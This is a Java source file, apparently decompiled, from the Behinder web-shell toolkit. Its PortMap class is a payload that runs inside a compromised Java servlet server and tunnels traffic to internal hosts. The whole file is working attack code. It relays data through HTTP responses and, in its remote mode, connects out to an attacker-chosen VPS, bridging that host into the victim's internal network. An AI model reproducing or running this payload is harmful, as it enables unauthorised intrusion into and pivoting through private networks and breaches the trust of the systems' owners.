package net.rebeyond.behinder.payload.java;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class PortMap implements Runnable {
   public static String action;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String remoteIP;
   public static String remotePort;
   public static String extraData;
   private HttpServletRequest Request;
   private HttpServletResponse Response;
   private HttpSession Session;
   String localKey;
   String remoteKey;
   String type;
   HttpSession httpSession;

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;
      this.Session = page.getSession();
      this.Response = (HttpServletResponse)page.getResponse();
      this.Request = (HttpServletRequest)page.getRequest();

      try {
         this.portMap(page);
      } catch (Exception var4) {
      }

      return true;
   }

   public void portMap(PageContext page) throws Exception {
      String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
      SocketChannel socketChannel = null;
      if (action.equals("createLocal")) {
         try {
            String target = targetIP;
            int port = Integer.parseInt(targetPort);
            socketChannel = SocketChannel.open();
            socketChannel.connect(new InetSocketAddress(target, port));
            socketChannel.configureBlocking(false);
            this.Session.setAttribute(localSessionKey, socketChannel);
            this.Response.setStatus(200);
         } catch (Exception var10) {
            Exception e = var10;
            var10.printStackTrace();
            ServletOutputStream so = null;

            try {
               so = this.Response.getOutputStream();
               so.write(new byte[]{55, 33, 73, 54});
               so.write(e.getMessage().getBytes());
               so.flush();
               so.close();
            } catch (IOException var9) {
               var9.printStackTrace();
            }
         }
      } else {
         Exception e;
         ServletOutputStream so = null;
         if (action.equals("read")) {
            socketChannel = (SocketChannel)this.Session.getAttribute(localSessionKey);
            if (socketChannel == null) {
               return;
            }

            try {
               ByteBuffer buf = ByteBuffer.allocate(512);
               socketChannel.configureBlocking(false);
               int bytesRead = socketChannel.read(buf);
               for(so = this.Response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                  so.write(buf.array(), 0, bytesRead);
                  so.flush();
                  buf.clear();
               }

               so.flush();
               so.close();
            } catch (Exception var12) {
               e = var12;
               var12.printStackTrace();
               this.Response.setStatus(200);
               socketChannel = null;

               try {
                  so = this.Response.getOutputStream();
                  so.write(new byte[]{55, 33, 73, 54});
                  so.write(e.getMessage().getBytes());
                  so.flush();
                  so.close();
                  socketChannel.socket().close();
               } catch (IOException var8) {
                  var8.printStackTrace();
               }
            }
         } else if (action.equals("write")) {
            socketChannel = (SocketChannel)this.Session.getAttribute(localSessionKey);

            try {
               byte[] extraDataByte = this.base64decode(extraData);
               ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
               buf.clear();
               buf.put(extraDataByte);
               buf.flip();

               while(buf.hasRemaining()) {
                  socketChannel.write(buf);
               }
            } catch (Exception var11) {
               e = var11;
               socketChannel = null;

               try {
                  so = this.Response.getOutputStream();
                  so.write(new byte[]{55, 33, 73, 54});
                  so.write(e.getMessage().getBytes());
                  so.flush();
                  so.close();
                  socketChannel.socket().close();
               } catch (IOException var7) {
                  var7.printStackTrace();
               }
            }
         } else {
            Enumeration attributeNames;
            String attrName;
            if (action.equals("closeLocal")) {
               attributeNames = this.Session.getAttributeNames();

               while(attributeNames.hasMoreElements()) {
                  attrName = attributeNames.nextElement().toString();
                  if (attrName.startsWith("local_")) {
                     this.Session.removeAttribute(attrName);
                  }
               }
            } else if (action.equals("createRemote")) {
               (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
               this.Response.setStatus(200);
            } else if (action.equals("closeRemote")) {
               this.Session.setAttribute("remoteRunning", false);
               attributeNames = this.Session.getAttributeNames();

               while(attributeNames.hasMoreElements()) {
                  attrName = attributeNames.nextElement().toString();
                  if (attrName.startsWith("remote")) {
                     this.Session.removeAttribute(attrName);
                  }
               }
            }
         }
      }

   }

   public PortMap(String localKey, String remoteKey, String type, HttpSession session) {
      this.localKey = localKey;
      this.remoteKey = remoteKey;
      this.httpSession = session;
      this.type = type;
   }

   public PortMap() {
   }

   public void run() {
      int bytesRead;
      if (this.type.equals("create")) {
         this.httpSession.setAttribute("remoteRunning", true);

         while((Boolean)this.httpSession.getAttribute("remoteRunning")) {
            try {
               String target = targetIP;
               int port = Integer.parseInt(targetPort);
               String vps = remoteIP;
               bytesRead = Integer.parseInt(remotePort);
               SocketChannel remoteSocketChannel = SocketChannel.open();
               remoteSocketChannel.connect(new InetSocketAddress(vps, bytesRead));
               String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
               this.httpSession.setAttribute(remoteKey, remoteSocketChannel);

               ByteBuffer buf = ByteBuffer.allocate(512);
               if ((bytesRead = remoteSocketChannel.read(buf)) > 0) {
                  remoteSocketChannel.configureBlocking(true);
                  SocketChannel localSocketChannel = SocketChannel.open();
                  localSocketChannel.connect(new InetSocketAddress(target, port));
                  localSocketChannel.configureBlocking(true);
                  String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                  this.httpSession.setAttribute(localKey, localSocketChannel);
                  localSocketChannel.socket().getOutputStream().write(buf.array(), 0, bytesRead);
                  (new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession))).start();
                  (new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession))).start();
               }
            } catch (Exception var13) {
               var13.printStackTrace();
            }
         }
      } else {
         SocketChannel localSocketChannel;
         SocketChannel remoteSocketChannel;
         ByteBuffer buf;
         OutputStream so;
         if (!this.type.equals("read")) {
            if (this.type.equals("write")) {
               while((Boolean)this.httpSession.getAttribute("remoteRunning")) {
                  try {
                     localSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.localKey);
                     remoteSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.remoteKey);
                     buf = ByteBuffer.allocate(512);
                     bytesRead = remoteSocketChannel.read(buf);

                     for(so = localSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = remoteSocketChannel.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                     }

                     so.flush();
                     so.close();
                  } catch (IOException var14) {
                     try {
                        Thread.sleep(10L);
                     } catch (Exception var11) {
                     }
                  }
               }
            }
         } else {
            while((Boolean)this.httpSession.getAttribute("remoteRunning")) {
               try {
                  localSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.localKey);
                  remoteSocketChannel = (SocketChannel)this.httpSession.getAttribute(this.remoteKey);
                  buf = ByteBuffer.allocate(512);
                  bytesRead = localSocketChannel.read(buf);

                  for(so = remoteSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = localSocketChannel.read(buf)) {
                     so.write(buf.array(), 0, bytesRead);
                     so.flush();
                     buf.clear();
                  }

                  so.flush();
                  so.close();
               } catch (IOException var15) {
                  try {
                     Thread.sleep(10L);
                  } catch (Exception var12) {
                  }
               }
            }
         }
      }

   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
         }
      } catch (Exception var6) {
      }

      return result;
   }
}
